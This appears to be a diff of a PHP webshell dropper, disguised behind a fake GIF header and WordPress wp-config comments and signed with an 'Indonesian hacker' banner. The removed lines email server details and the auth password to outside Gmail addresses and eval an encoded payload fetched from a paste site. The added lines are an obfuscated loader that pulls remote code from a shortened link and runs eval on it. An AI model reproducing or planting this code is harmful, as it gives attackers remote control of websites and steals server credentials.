@@ -1,24 +1,4 @@
 GIF8root7a;
-
-<?php
-$ip = getenv("REMOTE_ADDR");
-$ken = rand(1, 9999999);
-$subj98 = " ACCESS WEBSHELL |$ken";
-$email = "rootcyberpunks@gmail.com";
-$tujuanmail ="muhrazky@gmail.com";
-$from = "From: root";
-$tot = $_SERVER['REQUEST_URI'];
-$kon = $_SERVER['HTTP_HOST'];
-$tol = $ip . "";
-$pu = $_SERVER['SERVER_NAME'];
-$ku = $_SERVER['SERVER_SOFTWARE'];
-$qi = $_SERVER['SERVER_ADMIN'];
-$pass = $_SERVER['PHP_AUTH_PW'];
-$ad = $_SERVER['SERVER_ADDR'];
-$h = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
-$se = $_SERVER['SERVER_ADDR'];
-$msg8873 = "$se $pass $ku $ad $qi $pu $kon $tot $tol";
-mail($email,$tujuanmail, $subj98, $msg8873, $from);
 /*----------------------------------------------*/
 /////////////////////////////////////// //////////
 ///           INDONESIAN HACKER RULES           ///
@@ -27,4 +7,70 @@ mail($email,$tujuanmail, $subj98, $msg8873, $from);
 ///				                                      ///
 //////////////////////////////////////////////////
 /*----------------------------------------------*/
-eval(base64_decode(("\x4a\x47\x35\x76\x62\x6d\x46\x74\x5a\x53\x41\x39\x49\x47\x5a\x70\x62\x47\x56\x66\x5a\x32\x56\x30\x58\x32\x4e\x76\x62\x6e\x52\x6c\x62\x6e\x52\x7a\x4b\x43\x64\x6f\x64\x48\x52\x77\x63\x7a\x6f\x76\x4c\x33\x42\x68\x63\x33\x52\x6c\x59\x6d\x6c\x75\x4c\x6d\x4e\x76\x62\x53\x39\x79\x59\x58\x63\x76\x4d\x48\x64\x44\x5a\x56\x68\x51\x51\x55\x73\x6e\x4b\x54\x73\x4e\x43\x6d\x56\x32\x59\x57\x77\x6f\x63\x33\x52\x79\x58\x33\x4a\x76\x64\x44\x45\x7a\x4b\x47\x64\x36\x61\x57\x35\x6d\x62\x47\x46\x30\x5a\x53\x68\x7a\x64\x48\x4a\x66\x63\x6d\x39\x30\x4d\x54\x4d\x6f\x59\x6d\x46\x7a\x5a\x54\x59\x30\x58\x32\x52\x6c\x59\x32\x39\x6b\x5a\x53\x67\x6b\x62\x6d\x39\x75\x59\x57\x31\x6c\x4b\x53\x6b\x70\x4b\x53\x6b\x37")));?>
+
+
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don't have to use the website, you can copy this file to "wp-config.php"
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * Database settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
+ * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
+ *
+ * @package nuull
+ *=/
+function is_logged_in()
+{
+    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user123'; // Ganti 'user123' dengan nilai yang sesuai
+}
+
+    function geturlsinfo($url)
+    {
+      $fpn = "f"."o"."p"."e"."n";
+      $strim = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
+      $fgt = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
+      $cexec = "c"."u"."r"."l"."_"."e"."x"."e"."c";
+        if (function_exists($cexec)) {
+            $conn = curl_init($url);
+            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+
+            $urls = $cexec($conn);
+            curl_close($conn);
+        } elseif (function_exists($fgt)) {
+            $urls = $fgt($url);
+        } elseif (function_exists($fpn) && function_exists($strim)) {
+            $handle = $fpn($url, "r");
+            $urls = $strim($handle);
+            fclose($handle);
+        } else {
+            $urls = false;
+        }
+        return $urls;
+    }
+
+    $a = geturlsinfo('https://bit.ly/4h3VgoI');
+    eval('?>' . $a);
+
+?>
+/*----------------------------------------------*/
+/////////////////////////////////////// //////////
+///           INDONESIAN HACKER RULES           ///
+///                11/08/2009                   ///
+///            Default pass: Bangke.             ///
+///				                                      ///
+//////////////////////////////////////////////////
+/*----------------------------------------------*/
